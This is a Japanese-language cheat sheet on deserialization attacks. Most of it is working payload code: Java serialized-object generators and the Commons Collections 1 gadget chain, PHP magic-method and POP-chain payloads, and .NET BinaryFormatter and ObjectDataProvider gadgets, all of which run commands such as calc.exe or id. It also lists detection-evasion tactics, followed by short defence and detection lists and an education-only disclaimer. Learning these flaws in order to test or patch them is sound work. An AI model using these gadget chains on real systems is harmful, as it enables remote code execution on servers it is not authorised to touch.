# デシリアライゼーション攻撃手法

## 概要
各言語でのデシリアライゼーション脆弱性と攻撃手法について解説します。

## Java

### 基本的な攻撃
```java
// 脆弱なデシリアライゼーション
public class VulnerableClass implements Serializable {
    private String command;
    
    private void readObject(ObjectInputStream ois) throws Exception {
        ois.defaultReadObject();
        Runtime.getRuntime().exec(command);
    }
}

// 攻撃ペイロード生成
public static void main(String[] args) throws Exception {
    VulnerableClass vuln = new VulnerableClass();
    vuln.command = "calc.exe";
    
    ByteArrayOutputStream baos = new ByteArrayOutputStream();
    ObjectOutputStream oos = new ObjectOutputStream(baos);
    oos.writeObject(vuln);
    
    String payload = Base64.getEncoder().encodeToString(baos.toByteArray());
    System.out.println(payload);
}
```

### Commons Collections攻撃
```java
// CommonsCollections1ガジェットチェーン
Transformer[] transformers = new Transformer[] {
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod", 
        new Class[] {String.class, Class[].class},
        new Object[] {"getRuntime", new Class[0]}),
    new InvokerTransformer("invoke",
        new Class[] {Object.class, Object[].class},
        new Object[] {null, new Object[0]}),
    new InvokerTransformer("exec",
        new Class[] {String.class},
        new Object[] {"calc.exe"})
};

Transformer transformerChain = new ChainedTransformer(transformers);
Map innerMap = new HashMap();
innerMap.put("value", "value");
Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
```

## PHP

### 基本的な攻撃
```php
// 脆弱なクラス
class VulnerableClass {
    private $command = 'ls';
    
    function __wakeup() {
        system($this->command);
    }
}

// 攻撃ペイロード生成
$vuln = new VulnerableClass();
$payload = serialize($vuln);
echo base64_encode($payload);

// マジックメソッドを使用した攻撃
class Evil {
    function __toString() {
        system('id');
        return '';
    }
}
```

### POPチェーン攻撃
```php
// Property Oriented Programming
class A {
    public $b;
    function __destruct() {
        $this->b->execute();
    }
}

class B {
    public $cmd;
    function execute() {
        system($this->cmd);
    }
}

$b = new B();
$b->cmd = 'id';
$a = new A();
$a->b = $b;

echo serialize($a);
```

## .NET

### 基本的な攻撃
```csharp
// 脆弱なクラス
[Serializable]
public class VulnerableClass {
    public string command;
    
    [OnDeserialized]
    private void OnDeserialized(StreamingContext context) {
        Process.Start("cmd.exe", "/c " + command);
    }
}

// 攻撃ペイロード生成
var vuln = new VulnerableClass { command = "calc.exe" };
var formatter = new BinaryFormatter();
using (var ms = new MemoryStream()) {
    formatter.Serialize(ms, vuln);
    var payload = Convert.ToBase64String(ms.ToArray());
    Console.WriteLine(payload);
}
```

### ObjectDataProviderガジェット
```csharp
var payload = new ObjectDataProvider {
    MethodName = "Start",
    ObjectInstance = new Process(),
    MethodParameters = {
        "cmd.exe",
        "/c calc.exe"
    }
};
```

## 検知回避テクニック
- シリアライズデータの難読化
- 代替ガジェットチェーンの使用
- カスタムエンコーディング
- メモリ内実行

## 防御策
- 信頼できないデータのデシリアライズ禁止
- ホワイトリストによる型制限
- カスタムシリアライザの使用
- セキュアな設定の適用

## 検知方法
- 不審なデシリアライズ操作
- 異常なプロセス生成
- ガジェットチェーンの検出
- メモリパターンの分析

## 注意事項
- このテクニックは教育目的でのみ使用してください
- 実環境での使用は法的責任を伴う可能性があります
- すべてのテストは許可された環境でのみ行ってください 